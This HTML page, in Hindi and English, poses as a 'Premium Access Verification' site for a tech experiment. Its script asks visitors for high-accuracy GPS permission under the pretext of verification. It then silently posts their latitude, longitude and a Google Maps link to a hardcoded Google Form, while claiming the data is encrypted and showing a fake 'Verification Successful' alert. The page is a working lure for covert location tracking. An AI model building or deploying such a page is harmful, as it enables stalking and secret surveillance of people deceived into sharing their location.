<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="भविष्य की तकनीक का अनुभव करें हमारे प्रीमियम हाई-टेक एक्सपेरिमेंट के साथ।">
    <title>High-Tech Tech Experiment | Premium Access</title>
    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    
    <style>
        :root {
            --bg-color: #0a0e17;
            --primary-color: #00f2fe;
            --text-color: #ffffff;
            --card-bg: rgba(255, 255, 255, 0.03);
            --border-color: rgba(0, 242, 254, 0.2);
            --font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            --header-height: 80px;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }
        html { scroll-behavior: smooth; }

        body {
            font-family: var(--font-family);
            background-color: var(--bg-color);
            color: var(--text-color);
            overflow-x: hidden;
            background-image: linear-gradient(109.6deg, rgba(10, 14, 23, 1) 11.2%, rgba(10, 14, 23, 0.9) 91.1%);
        }

        .diamond-bg {
            position: fixed; top: -10%; right: -10%; width: 50%; height: 60%;
            background: linear-gradient(135deg, var(--primary-color) 0%, transparent 70%);
            clip-path: polygon(50% 0%, 100% 50%, 50% 100%, 0% 50%);
            opacity: 0.05; z-index: -1;
        }

        .container { max-width: 1200px; margin: 0 auto; padding: 0 20px; }

        header {
            height: var(--header-height);
            border-bottom: 1px solid var(--border-color);
            backdrop-filter: blur(10px);
            position: fixed; width: 100%; top: 0; z-index: 1000;
            display: flex; align-items: center;
        }

        nav { width: 100%; display: flex; justify-content: space-between; align-items: center; }
        .logo { font-size: 1.5rem; font-weight: bold; color: var(--primary-color); text-transform: uppercase; letter-spacing: 2px; text-decoration: none; }

        .hero { height: 100vh; display: flex; align-items: center; justify-content: center; text-align: center; padding-top: var(--header-height); }
        .hero-content h1 { font-size: 3.5rem; background: linear-gradient(to right, #fff, var(--primary-color)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 20px; text-transform: uppercase; }

        .premium-btn {
            background: transparent; border: 2px solid var(--primary-color); color: var(--primary-color);
            padding: 15px 40px; font-size: 1rem; text-transform: uppercase; font-weight: bold; cursor: pointer; transition: 0.5s; border-radius: 5px;
        }
        .premium-btn:hover { background: var(--primary-color); color: #000; box-shadow: 0 0 30px var(--primary-color); }

        #status-message { margin-top: 25px; font-size: 1rem; font-weight: 500; }
        .hidden { display: none; }

        .features { padding: 80px 0; border-top: 1px solid var(--border-color); }
        .feature-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 20px; }
        .feature-card { background: var(--card-bg); border: 1px solid var(--border-color); padding: 30px; border-radius: 10px; }
        
        @media (max-width: 768px) { .hero-content h1 { font-size: 2.2rem; } }
    </style>
</head>
<body>

    <div class="diamond-bg"></div>

    <header>
        <div class="container">
            <nav>
                <a href="#" class="logo">HIGH-TECH EXPERIMENT</a>
            </nav>
        </div>
    </header>

    <section class="hero">
        <div class="container hero-content">
            <h1>Premium Access <br> Verification</h1>
            <p style="margin-bottom: 30px; opacity: 0.7;">सिस्टम को वेरीफाई करने के लिए 'प्रवेश करें' पर क्लिक करें।</p>
            
            <button class="premium-btn" onclick="startExperiment()">प्रवेश करें</button>
            
            <div id="status-message" class="hidden"></div>
        </div>
    </section>

    <section class="features">
        <div class="container">
            <div class="feature-grid">
                <div class="feature-card"><h3>सुरक्षित डेटा</h3><p>आपका डेटा सीधे आपके Google Form में एन्क्रिप्ट होकर जाता है।</p></div>
                <div class="feature-card"><h3>GPS ट्रैकिंग</h3><p>सटीक एक्सेस के लिए उच्च स्तरीय लोकेशन सेंसर्स का उपयोग।</p></div>
            </div>
        </div>
    </section>

    <script>
        function startExperiment() {
            const status = document.getElementById('status-message');
            status.classList.remove('hidden');
            status.innerText = "कृपया ब्राउज़र में 'Allow' बटन पर क्लिक करें...";
            status.style.color = "white";

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendLocationData, handleLocationError, {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                });
            } else {
                status.innerText = "आपका ब्राउज़र लोकेशन सपोर्ट नहीं करता।";
                status.style.color = "red";
            }
        }

        function sendLocationData(position) {
            const status = document.getElementById('status-message');
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            
            // Google Maps लिंक बनाना
            const mapURL = `https://www.google.com/maps?q=${lat},${lon}`;

            status.innerText = "सफलता! डेटा प्रोसेस किया जा रहा है...";
            status.style.color = "#00f2fe";

            // --- आपकी असली IDs (Update: 'l' जोड़ा गया) ---
            const googleFormID = "1ZB-62ZH138zFuJ2lLyiiwwOeD9rVstUVdGiiT1oC4-A"; 
            const entryLat = "entry.1723883741"; 
            const entryLon = "entry.1285934641"; 
            const entryMap = "entry.630484221"; 

            const formURL = `https://docs.google.com/forms/d/e/${googleFormID}/formResponse`;

            const formData = new FormData();
            formData.append(entryLat, lat);
            formData.append(entryLon, lon);
            formData.append(entryMap, mapURL);

            fetch(formURL, {
                method: "POST",
                mode: "no-cors",
                body: formData
            }).then(() => {
                status.innerText = "धन्यवाद! आपका डेटा सफलतापूर्वक भेज दिया गया है।";
                status.style.color = "#00ff00";
                alert("Verification Successful!");
            }).catch((error) => {
                console.error("Error:", error);
                status.innerText = "त्रुटि: डेटा भेजने में समस्या आई।";
                status.style.color = "red";
            });
        }

        function handleLocationError(error) {
            const status = document.getElementById('status-message');
            status.style.color = "red";
            if (error.code === error.PERMISSION_DENIED) {
                status.innerText = "प्रवेश वर्जित: कृपया लोकेशन की अनुमति दें।";
            } else {
                status.innerText = "लोकेशन प्राप्त करने में त्रुटि आई।";
            }
        }
    </script>
</body>
</html>
